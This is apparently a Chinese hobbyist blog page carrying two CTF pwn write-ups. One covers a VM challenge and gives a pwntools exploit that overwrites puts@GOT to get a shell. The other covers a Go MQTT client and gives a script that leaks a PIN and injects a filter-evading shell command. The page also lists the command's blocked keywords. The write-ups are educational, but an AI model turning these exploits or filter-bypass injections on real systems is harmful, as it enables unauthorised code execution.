<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="逝者如斯夫，不舍昼夜">
<meta property="og:type" content="website">
<meta property="og:title" content="No_t1me&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="No_t1me&#39;s blog">
<meta property="og:description" content="逝者如斯夫，不舍昼夜">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="no_t1me">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>No_t1me's blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">No_t1me's blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">lost in binary</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">no_t1me</p>
  <div class="site-description" itemprop="description">逝者如斯夫，不舍昼夜</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/No-t1me" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;No-t1me" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:birty073@126.com" title="email → mailto:birty073@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>email</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          友情链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://ret2ldz.github.io/" title="https:&#x2F;&#x2F;ret2ldz.github.io" rel="noopener" target="_blank">ldz</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://www.jimmmmmiesblog.cn/" title="https:&#x2F;&#x2F;www.jimmmmmiesblog.cn" rel="noopener" target="_blank">Jimmy</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://aucept.in/" title="https:&#x2F;&#x2F;aucept.in" rel="noopener" target="_blank">Auceptin</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">EZVM做题记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-11-12 08:02:32 / 修改时间：08:46:03" itemprop="dateCreated datePublished" datetime="2025-11-12T08:02:32+08:00">2025-11-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在fnz比赛中，遇到一道对于本人现阶段较有挑战性的一道VM题，这里记录一下做题的过程。</p>
<blockquote>
<p>VM题目一般会用程序语言去模拟某些解释器性质功能，往往拥有较大的代码量，需要逆向去还原题目的指令集功能以及解释器相关的结构体等</p>
</blockquote>
<p>题目是EZVM，打开时看看保：没开pei，Partial RELRO，其他保护全开。libc版本来到了2.35，每次给了libc的题目可以利用<code>strings libc.so.6 | grep &quot;ubuntu&quot;</code>来看一下题目给的libc版本，特别是有堆利用的题目。</p>
<p>ida打开程序，总览main函数，交互包括读取name，opcode，data，并进入一个类似于操作opcode与data的解析函数，根据返回值去调用输出name与输出data的函数。这个题目存在一个比较关键的结构，其管理了一个模拟的栈，其对应的成员如图：<img src="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png">。题目中有些关键的栈操作函数如果不在ida中转化变量为结构体还是很难逆的。<img src="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2.png">这里实现了栈的push功能。关键逻辑还是在解析函数中，对于存储opcode的栈依次弹栈并switch_case判断opecode跳到不同操作函数中(已经算是非常直接的解析逻辑了。<img src="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/3.png"></p>
<p>这里关注两个函数:push_align与write_align</p>
<ul>
<li>push_align会pop work_arena栈顶值作为相对当前栈顶的偏移push对应位置的8字节内容</li>
<li>write_align会分别pop write_content与align作为写入地址以及相对当前栈顶的偏移</li>
</ul>
<p>观察程序发现三个栈都处于堆中，其实不难发现我具有堆空间内的任意地址读写。初步想法是寻找堆区域的libc地址，对地址做操作打__free_hook(当时忘记是libc3.35了。。)。然而因为执行解析操作时堆结构并没有free的unsorted_bin，堆空间也就没有libc地址可以用了。再次观察堆空间有的堆块：除了三个栈本体与存name的chunk，还有三个my_stack管理结构。而对于栈的实体的定位取决于第一个字长数据，将work_area栈管理结构中指针改到pei中地址，相当于实现了ELF文件的任意读写。不难想到直接劫持got表是最直接的方法，刚好后续会puts一个我们控制指向内容的name指针。直接name为&#x2F;bin&#x2F;sh即可！</p>
<blockquote>
<p>补充：注意题目的交互方式，opcode逐字节进行了特定处理，data对输入数字进行字节转换，并以空格分隔每个数字</p>
</blockquote>
<p>Exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">40894</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]-libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#虚拟逻辑：opcode前后4字交换 Data存数字对应字节码</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;opcode： </span></span><br><span class="line"><span class="string">0x45 弹data到操作区</span></span><br><span class="line"><span class="string">0x65 弹操作区到data</span></span><br><span class="line"><span class="string">0xC5 加</span></span><br><span class="line"><span class="string">0x21 减</span></span><br><span class="line"><span class="string">0x23 除</span></span><br><span class="line"><span class="string">0x14 乘</span></span><br><span class="line"><span class="string">0x25 按照栈顶索引改写数据</span></span><br><span class="line"><span class="string">0x46 按照栈顶索引读数据到操作区栈顶</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">思路：</span></span><br><span class="line"><span class="string">构造opcode：先写操作栈指针为bss位置，任意读数据读取puts_got值，将data_push到操作栈上，进行运算实现system，写到puts_got位置，最后puts(name)实现getshell</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got=<span class="number">0x405020</span></span><br><span class="line">align_got=<span class="number">0x300e0</span></span><br><span class="line"><span class="comment"># align_bss=</span></span><br><span class="line">bss=puts_got+<span class="number">0x400</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name :)\n&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;OPCODE :)\n&#x27;</span>,<span class="string">b&#x27;\x45\x45\x25\x45\x45\x46\x21\x45\x25&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;DATA :)\n&#x27;</span>,<span class="built_in">str</span>(bss).encode()+<span class="string">b&#x27; -3 &#x27;</span>+<span class="built_in">str</span>(align_got).encode()+<span class="string">b&#x27; -128 -127&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">mqtt2做题记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-11-11 13:48:36 / 修改时间：15:20:17" itemprop="dateCreated datePublished" datetime="2025-11-11T13:48:36+08:00">2025-11-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>ldz师傅分享了一道有趣的题目，在做题过程中本人收获颇丰，接触到了许多新的知识点，记录一下做题(学习过程)</p>
</blockquote>
<h2 id="前置知识学习"><a href="#前置知识学习" class="headerlink" title="前置知识学习"></a>前置知识学习</h2><p>在做题中接触的新知识较多，理解这些知识是搞懂题目逻辑的关键点，这里在篇首回顾一遍流程中学习的内容</p>
<h3 id="go语言的逆向"><a href="#go语言的逆向" class="headerlink" title="go语言的逆向"></a>go语言的逆向</h3><p>go语言生成的可执行程序一打开有点想c语言静态编译的样子，程序入口为<code>main_main</code>这里注意一般来说，<code>main_任意名字</code>代表这个函数&#x2F;变量是程序自定义的，而形如<code>runtime_writeBarrier()</code>类似的函数代表是go中runtime库对应的函数，另外题目中出现的<code>github_com_eclipse_paho_2emqtt_2egolang__ptr_ClientOptions_AddBroker()</code>这样的函数也是外部包导入的函数。</p>
<p>go的字符串与c++有很大区别，是二进制安全的，它不以\0作为终止符，一个字符串对象在内存中分为两部分，一部分为如下结构，占两个机器字用于索引数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">type StringHeader <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    Data uintptr            <span class="comment">// 字符串首地址</span></span><br><span class="line"> </span><br><span class="line">    Len  <span class="type">int</span>                <span class="comment">// 字符串长度</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而它的另一部分才存放真正的数据，它的大小由字符串长度决定，在逆向中重点关注的是如上结构，因此说一个string占两个机器字，其他结构也按这种约定。</p>
<p>go语言一大特性就是用户层面实现的<strong>协程（Goroutine）</strong>，本质是轻量化的线程，能够轻松实现高并发，利用go函数启动一个Goroutine独立与主线程异步运行。对于协程的调度模型有非常多的内容，与本体无直接关联，具体实现可以参考：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20862617">https://www.zhihu.com/question/20862617</a></p>
<h3 id="MQTT协议"><a href="#MQTT协议" class="headerlink" title="MQTT协议"></a>MQTT协议</h3><p>MQTT（Message Queuing Telemetry Transport）是一种轻量级、基于发布-订阅模式的消息传输协议，适用于资源受限的设备和低带宽、高延迟或不稳定的网络环境。它在物联网应用中广受欢迎，能够实现传感器、执行器和其它设备之间的高效通信。</p>
<h4 id="MQTT-Broker"><a href="#MQTT-Broker" class="headerlink" title="MQTT Broker"></a>MQTT Broker</h4><p>MQTT Broker 是负责处理客户端请求的关键组件，包括建立连接、断开连接、订阅和取消订阅等操作，同时还负责消息的转发。通常题目中会连接一个mqtt的brocker，绑定到一个开启mqtt服务的端口上，同时对于返回的<code>ClientOptions</code>进行连接函数绑定，消息处理函数绑定，新建一个<strong>mqtt客户端。</strong></p>
<h4 id="MQTT-Client"><a href="#MQTT-Client" class="headerlink" title="MQTT Client"></a>MQTT Client</h4><p>任何运行 <a target="_blank" rel="noopener" href="https://www.emqx.com/zh/mqtt-client-sdk">MQTT 客户端库</a>的应用或设备都是 MQTT 客户端。例如，使用 MQTT 的即时通讯应用是客户端，使用 MQTT 上报数据的各种传感器是客户端，各种 <a target="_blank" rel="noopener" href="https://www.emqx.com/zh/blog/mqtt-client-tools">MQTT 测试工具</a>也是客户端。</p>
<h4 id="MQTT-的工作流程："><a href="#MQTT-的工作流程：" class="headerlink" title="MQTT 的工作流程："></a>MQTT 的工作流程：</h4><ol>
<li><strong>客户端使用 TCP&#x2F;IP 协议与 Broker 建立连接</strong>，可以选择使用 TLS&#x2F;SSL 加密来实现安全通信。客户端提供认证信息，并指定会话类型（Clean Session 或 Persistent Session）。</li>
<li><strong>客户端既可以向特定主题发布消息，也可以订阅主题以接收消息</strong>。当客户端发布消息时，它会将消息发送给 MQTT Broker；而当客户端订阅消息时，它会接收与订阅主题相关的消息。**同时注意在用户端可以将特定主题绑定特定的massage_handler函数，实现接收到主题消息回调。**一个客户端也可以绑定一个连接函数，代表连接上brocker执行的动作，一般为subscribe一些主题</li>
<li><strong>MQTT Broker 接收发布的消息</strong>，并将这些消息转发给订阅了对应主题的客户端。它根据 QoS 等级确保消息可靠传递，并根据会话类型为断开连接的客户端存储消息。</li>
</ol>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>终于到题目了，这个题目其实就是利用go中的<code>github_com_eclipse_paho_2emqtt_2egolang</code>外部库连接到本地的brocker，创建了客户端，同时绑定了连接函数自动subscribe CTF主题，消息回调函数message_handler(具有命令执行漏洞)。并创建一个<code>Goroutine</code>每隔一段时间在<strong>CTF&#x2F;send</strong>主题下publihs一个泄露ping码的信息。注意对于这种题目的pwn方法是：我们需要自己写一个MQTT Client，通过利用这个有漏洞的MQTT Client从而getflag。</p>
<p>思路还是比较清晰的：创建题目中对应broker服务器的连接，根据题目subscribe的主题publish相应内容的信息从而触发有漏洞消息回调函数getflag。</p>
<p>题目文件中对于mqtt client的初始化：<img src="/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png"></p>
<blockquote>
<p>注意这里直接在**<code>ClientOptions</code>**结构体中声明massage_handler代表该客户端只要收到自己subscribe的主题publish的消息就会触发</p>
</blockquote>
<p>massage_handler函数中逻辑比较简单：解析json消息格式，提取auth，cmd，arg字段。先检查auth内容是否长度为6且等于特定加密算法后的pin值前6位，然后判断cmd中字段是否等于<code>get_version</code>或者<code>set_vin</code>：get_version打开&#x2F;mnt&#x2F;version文件输出内容；set_vin将arg内容拼接到echo -n %s &gt; &#x2F;mnt&#x2F;VIN中。注意这里对于参数进行了比较严苛的子字符串检测常用的显示函数如<code>cat,tail以及flag</code>都被ban了。这里用‘’阶段一下cat以及flag，同时利用<code>;</code>注入命令，就能把flag内容带出来了。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> paho.mqtt <span class="keyword">import</span> client <span class="keyword">as</span> mqtt_client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">broker = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"><span class="comment"># Generate a Client ID with the publish prefix.</span></span><br><span class="line">client_id = <span class="string">f&#x27;publish-<span class="subst">&#123;random.randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;public&#x27;</span></span><br><span class="line">main_lookup=[]</span><br><span class="line">received_pin=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    main_lookup.append ((<span class="number">37</span> * i + <span class="number">13</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize_connect</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_connect</span>(<span class="params">client, userdata, flags, reasonCode, properties=<span class="literal">None</span></span>):</span><br><span class="line">        client.subscribe(<span class="string">&quot;CTF&quot;</span>)</span><br><span class="line">        client.subscribe(<span class="string">&quot;CTF/send&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection created with topics subscribed&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">client, userdata, msg</span>):</span><br><span class="line">        message=msg.payload</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        data = json.loads(msg.payload.decode())</span><br><span class="line">        received_pin = data[<span class="string">&quot;pin&quot;</span>] </span><br><span class="line"></span><br><span class="line">    <span class="comment">#接下来进行与mqtt服务端连接的初始化</span></span><br><span class="line">    client = mqtt_client.Client(mqtt_client.CallbackAPIVersion.VERSION2, client_id)</span><br><span class="line">    client.on_connect = on_connect</span><br><span class="line">    client.on_message = on_message<span class="comment">#绑定连接的回调函数</span></span><br><span class="line">    client.connect(broker, port, keepalive=<span class="number">10000</span>)<span class="comment">#连接服务器</span></span><br><span class="line">    <span class="keyword">return</span> client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrpyt</span>(<span class="params">buf</span>):</span><br><span class="line">    ans=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        tmp1=main_lookup[<span class="built_in">ord</span>(buf[i])]</span><br><span class="line">        out_byte=tmp1 - <span class="number">95</span>*((<span class="number">345</span>*tmp1)&gt;&gt;<span class="number">15</span>) + <span class="number">32</span></span><br><span class="line">        ans.append(<span class="built_in">chr</span>(out_byte))</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">auth:<span class="built_in">str</span>, cho_cmd:<span class="built_in">int</span>, arg:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> cho_cmd == <span class="number">1</span>:</span><br><span class="line">        cmd = <span class="string">&quot;get_version&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :cmd = <span class="string">&quot;set_vin&quot;</span></span><br><span class="line"></span><br><span class="line">    message = &#123;</span><br><span class="line">        <span class="string">&quot;auth&quot;</span>: auth,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: cmd,</span><br><span class="line">        <span class="string">&quot;arg&quot;</span>: arg</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用列表：cat more head tail string awk sed cut xxd hexdump cmp diff base64 | &amp; $( 0x60 &gt; &lt; &gt;&gt; &lt;&lt; || &amp;&amp; sh  bash exec nc socat teknet ftp ... flag /dev .. gzip tar :method: :path :scheme :status accept-charset accept-encoding accept-language accept-range accept &quot;access-control-allow-origin age</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    client = initialize_connect()</span><br><span class="line">    client.loop_start()</span><br><span class="line">    client.publish(<span class="string">&quot;CTF/send&quot;</span>, <span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#泄露ping值</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#这里用publish CTF/send泄露pin值</span></span><br><span class="line">    mes = send_message(decrpyt(received_pin),<span class="number">0</span>,<span class="string">&#x27;;c\&#x27;\&#x27;at fl\&#x27;\&#x27;ag ;&#x27;</span>)<span class="comment">#从print内容中可以看到flag内容</span></span><br><span class="line">    client.publish(<span class="string">&quot;CTF&quot;</span>, json.dumps(mes))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    client.loop_stop()</span><br><span class="line">    client.disconnect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

